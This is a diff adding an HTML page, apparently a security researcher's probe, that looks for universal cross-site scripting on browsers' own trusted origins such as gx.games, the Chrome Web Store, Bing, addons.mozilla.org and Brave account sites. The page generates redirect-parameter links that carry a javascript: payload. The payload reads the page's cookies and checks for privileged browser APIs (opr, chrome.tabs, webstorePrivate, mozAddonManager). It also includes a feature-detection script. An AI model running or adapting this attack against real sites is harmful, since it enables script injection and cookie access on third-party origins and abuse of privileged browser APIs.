@@ -1,0 +1,57 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Privileged trusted-origin UXSS probe</title>
+<style>
+  body{font-family:-apple-system,system-ui,sans-serif;margin:0;padding:18px;line-height:1.5}
+  h2{margin:16px 0 4px;font-size:15px}
+  a{display:block;color:#0b62d6;word-break:break-all;margin:5px 0;font-size:12.5px}
+  button{background:#d92d20;color:#fff;border:0;border-radius:8px;padding:12px 18px;font-size:15px;font-weight:600;margin:8px 0}
+  #fd{background:#0f1115;color:#d7e0ea;border-radius:8px;padding:10px 12px;font-family:ui-monospace,Menlo,monospace;font-size:12px;white-space:pre-wrap;margin-top:8px}
+  small{color:#666}
+</style>
+</head>
+<body>
+<h1>Privileged trusted-origin UXSS probe</h1>
+<p>Pattern (renwa Opera gx.games): browsers inject privileged JS APIs (<code>opr.*</code>, <code>chrome.tabs</code>, <code>webstorePrivate</code>, <code>mozAddonManager</code>) into their OWN trusted web origins. A <code>javascript:</code> landing there via a redirect param = UXSS + those APIs. Open in the TARGET browser, tap its links.</p>
+<button onclick="fd()">Feature-detect privileged APIs on THIS origin</button>
+<div id="fd">tap to run</div>
+<div id="links"></div>
+<small>Success = a link alerts <b>pwned by 33x | &lt;trusted origin&gt;</b> (domain = the browser's origin, NOT this page) and the feature-detect shows opr/tabs/webstore/mozAddon present.</small>
+<script>
+var P = "javascript:alert('pwned by 33x | '+document.domain+' | c='+document.cookie+' | opr='+(typeof window.opr)+' tabs='+(typeof(window.chrome&&chrome.tabs))+' store='+(typeof(window.chrome&&chrome.webstorePrivate))+' es='+(typeof(window.chrome&&chrome.embeddedSearch))+' edge='+(typeof(window.chrome&&chrome.edgeMarketingPagePrivate))+' moz='+(typeof navigator.mozAddonManager))//";
+function fd(){
+  document.getElementById('fd').textContent =
+    'origin: '+document.domain+'\n'+
+    'opr='+(typeof window.opr)+'  opr.identity='+(typeof(window.opr&&opr.operaIdentityPrivate))+'\n'+
+    'chrome.tabs='+(typeof(window.chrome&&chrome.tabs))+'  webstorePrivate='+(typeof(window.chrome&&chrome.webstorePrivate))+'\n'+
+    'embeddedSearch='+(typeof(window.chrome&&chrome.embeddedSearch))+'  edgeMarketingPagePrivate='+(typeof(window.chrome&&chrome.edgeMarketingPagePrivate))+'\n'+
+    'mozAddonManager='+(typeof navigator.mozAddonManager)+'  ethereum.isBrave='+(typeof(window.ethereum&&ethereum.isBraveWallet));
+}
+var params = ['redirectUrl','redirect_url','returnUrl','return_url','continue','next','redirect','redirect_uri','url','to','goto','dest'];
+var groups = {
+  'Opera / Opera GX (opr.* + chrome.tabs)': ['https://gx.games/signup/','https://gx.games/','https://auth.opera.com/account/login','https://www.opera.com/'],
+  'Chrome / Arc / Dia / Brave / Edge (Web Store: webstorePrivate)': ['https://chromewebstore.google.com/','https://chrome.google.com/webstore'],
+  'Edge (edgeMarketingPagePrivate)': ['https://www.bing.com/','https://www.microsoft.com/','https://ntp.msn.com/'],
+  'Firefox (mozAddonManager)': ['https://addons.mozilla.org/en-US/firefox/','https://accounts.firefox.com/'],
+  'Brave (account APIs)': ['https://account.brave.com/','https://rewards.brave.com/']
+};
+var out = document.getElementById('links');
+Object.keys(groups).forEach(function(g){
+  var h=document.createElement('h2'); h.textContent=g; out.appendChild(h);
+  groups[g].forEach(function(base){
+    params.forEach(function(pm){
+      var sep = base.indexOf('?')>=0 ? '&' : '?';
+      var a=document.createElement('a');
+      a.href = base + sep + pm + '=' + encodeURIComponent(P);
+      a.target='_blank'; a.rel='noreferrer';
+      a.textContent = base.replace('https://','') + '  ['+pm+']';
+      out.appendChild(a);
+    });
+  });
+});
+</script>
+</body>
+</html>
